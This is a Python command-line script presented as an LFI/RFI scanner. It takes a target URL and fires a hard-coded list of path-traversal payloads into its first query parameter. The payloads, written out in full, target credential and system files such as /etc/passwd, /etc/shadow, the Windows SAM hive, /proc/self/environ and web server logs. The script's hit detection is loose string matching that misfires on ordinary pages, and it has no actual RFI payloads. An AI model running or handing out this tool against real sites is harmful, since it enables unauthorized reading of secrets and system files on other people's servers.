#!/usr/bin/env python3
"""
LFI/RFI Scanner
Usage: python lfi_scanner.py https://target.com/view?page=
"""

import sys
import requests
import urllib.parse

class LFIScanner:
    def __init__(self, url):
        self.url = url
        self.findings = []
        
        # LFI payloads
        self.payloads = [
            '../../../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd%00',
            '../../etc/passwd%00',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '../../../var/log/apache2/access.log',
            '../../../var/log/apache/access.log',
            '../../../var/log/nginx/access.log',
            '..%5C..%5C..%5Cetc%5Cpasswd',
            '..\\..\\..\\etc\\passwd',
            '..%252F..%252F..%252Fetc%252Fpasswd',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/version',
            '/proc/cmdline',
            '../../../bin/bash',
            '../../../bin/sh',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\win.ini',
            '../../boot.ini',
            '../../windows/system32/drivers/etc/hosts',
            '/etc/resolv.conf',
            '/etc/ftpusers',
            '/etc/crontab',
            '/etc/sysctl.conf',
        ]
        
    def test_path(self, payload):
        """Test LFI"""
        try:
            parsed = urllib.parse.urlparse(self.url)
            params = urllib.parse.parse_qs(parsed.query)
            
            for key in params:
                params[key] = [payload]
                break
            
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            
            r = requests.get(new_url, timeout=10)
            
            # Check for LFI indicators
            if 'root:' in r.text or '[' in r.text:
                if 'root' in r.text or 'Administrator' in r.text:
                    return {'payload': payload, 'found': 'etc/passwd'}
            if 'boot' in r.text.lower():
                return {'payload': payload, 'found': 'boot.ini'}
            
        except Exception as e:
            return None
        
        return None
    
    def scan(self):
        """Scan for LFI"""
        print(f"[*] Scanning {self.url}...")
        
        for payload in self.payloads:
            result = self.test_path(payload)
            if result and 'found' in result:
                print(f"[!] LFI: {payload}")
                self.findings.append(result)
        
        return self.findings


def main():
    if len(sys.argv) < 2:
        print("Usage: python lfi_scanner.py <url>")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = LFIScanner(target)
    scanner.scan()


if __name__ == "__main__":
    main()